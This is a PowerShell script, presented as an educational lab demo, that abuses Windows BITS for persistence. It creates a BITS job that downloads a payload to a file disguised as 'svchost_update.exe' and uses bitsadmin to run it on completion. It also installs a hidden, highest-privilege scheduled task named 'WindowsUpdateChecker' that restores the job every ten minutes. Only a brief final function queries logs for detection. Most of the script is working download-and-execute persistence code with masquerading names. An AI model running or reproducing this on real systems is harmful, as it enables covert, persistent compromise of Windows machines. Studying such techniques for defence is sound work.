# ============================================================
# BITS Persistence Demo Script
# Demonstrates how attackers abuse BITS for persistent access
# FOR EDUCATIONAL PURPOSES ONLY - Authorized lab environment
# ============================================================

# -----------------------------------------------------------
# CONFIGURATION - Use environment variables, no hardcoded creds
# -----------------------------------------------------------
$JobName     = if ($env:BITS_JOB_NAME)    { $env:BITS_JOB_NAME }    else { "SystemUpdateJob" }
$PayloadUrl  = if ($env:BITS_PAYLOAD_URL) { $env:BITS_PAYLOAD_URL } else { "http://127.0.0.1/payload.exe" }
$DestPath    = if ($env:BITS_DEST_PATH)   { $env:BITS_DEST_PATH }   else { "C:\Windows\Temp\svchost_update.exe" }
$LogFile     = "C:\Windows\Temp\bits_monitor.log"

function Write-Log {
    param([string]$Message)
    $ts = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    "$ts - $Message" | Out-File -Append -FilePath $LogFile
    Write-Host "[*] $Message"
}

# -----------------------------------------------------------
# 1. ENUMERATE EXISTING BITS JOBS
# -----------------------------------------------------------
function Get-BITSJobs {
    Write-Log "Enumerating existing BITS jobs..."
    $jobs = Get-BitsTransfer -AllUsers -ErrorAction SilentlyContinue
    if ($jobs) {
        foreach ($job in $jobs) {
            Write-Log "Job: $($job.JobId) | Name: $($job.DisplayName) | State: $($job.JobState)"
        }
    } else {
        Write-Log "No existing BITS jobs found."
    }
    return $jobs
}

# -----------------------------------------------------------
# 2. CREATE MALICIOUS BITS JOB
# -----------------------------------------------------------
function New-MaliciousBITSJob {
    param(
        [string]$Name     = $JobName,
        [string]$Url      = $PayloadUrl,
        [string]$Dest     = $DestPath
    )
    Write-Log "Creating BITS job: $Name"

    # Remove existing job with same name if present
    Get-BitsTransfer -AllUsers -ErrorAction SilentlyContinue |
        Where-Object { $_.DisplayName -eq $Name } |
        Remove-BitsTransfer -ErrorAction SilentlyContinue

    # Create the BITS download job
    $job = Start-BitsTransfer `
        -DisplayName $Name `
        -Source $Url `
        -Destination $Dest `
        -Asynchronous `
        -Priority Low `
        -RetryInterval 60 `
        -RetryTimeout 1209600  # Retry for up to 14 days

    Write-Log "Job created with ID: $($job.JobId)"
    return $job
}

# -----------------------------------------------------------
# 3. CONFIGURE PERSISTENCE - NOTIFY COMMAND ON COMPLETION
# -----------------------------------------------------------
function Set-BITSPersistence {
    param($Job)
    Write-Log "Configuring job to execute payload on completion..."

    # Set notification command: execute payload after download
    bitsadmin /SetNotifyCmdLine $Job.JobId "$DestPath" "" | Out-Null
    bitsadmin /SetNotifyFlags $Job.JobId 1 | Out-Null  # 1 = notify on job completion

    Write-Log "Persistence configured: payload will execute when download completes."
}

# -----------------------------------------------------------
# 4. CHECKER SCRIPT - Monitor and restore BITS job if removed
# -----------------------------------------------------------
function Install-BITSChecker {
    Write-Log "Installing BITS job checker via Scheduled Task..."

    $checkerScript = @"
# BITS Job Checker - Restores job if removed
`$JobName = '$JobName'
`$existing = Get-BitsTransfer -AllUsers -ErrorAction SilentlyContinue | Where-Object { `$_.DisplayName -eq `$JobName }
if (-not `$existing) {
    Start-BitsTransfer -DisplayName `$JobName -Source '$PayloadUrl' -Destination '$DestPath' -Asynchronous -Priority Low -RetryInterval 60 -RetryTimeout 1209600
    Add-Content -Path '$LogFile' -Value "$(Get-Date) - BITS job restored by checker"
}
"@
    $checkerPath = "C:\Windows\Temp\bits_checker.ps1"
    Set-Content -Path $checkerPath -Value $checkerScript

    # Register as scheduled task running every 10 minutes
    $action  = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ep Bypass -WindowStyle Hidden -File `"$checkerPath`""
    $trigger = New-ScheduledTaskTrigger -RepetitionInterval (New-TimeSpan -Minutes 10) -Once -At (Get-Date)
    $settings = New-ScheduledTaskSettingsSet -Hidden

    Register-ScheduledTask `
        -TaskName "WindowsUpdateChecker" `
        -Action $action `
        -Trigger $trigger `
        -Settings $settings `
        -RunLevel Highest `
        -Force | Out-Null

    Write-Log "Checker installed as scheduled task 'WindowsUpdateChecker' (every 10 min)."
}

# -----------------------------------------------------------
# 5. DETECTION - Check Windows Event Logs for BITS activity
# -----------------------------------------------------------
function Get-BITSEventLogs {
    Write-Log "Querying Windows Event Logs for BITS activity..."
    Get-WinEvent -LogName "Microsoft-Windows-Bits-Client/Operational" -MaxEvents 20 -ErrorAction SilentlyContinue |
        Select-Object TimeCreated, Id, Message |
        Format-List
}

# -----------------------------------------------------------
# MAIN
# -----------------------------------------------------------
Write-Host "============================================================"
Write-Host "  BITS Persistence Demonstration"
Write-Host "============================================================"

# Step 1: Enumerate
Get-BITSJobs

# Step 2: Create job
$job = New-MaliciousBITSJob

# Step 3: Configure persistence
if ($job) {
    Set-BITSPersistence -Job $job
}

# Step 4: Install checker
Install-BITSChecker

# Step 5: Show detection indicators
Get-BITSEventLogs

Write-Log "Demo complete. Check $LogFile for full log."
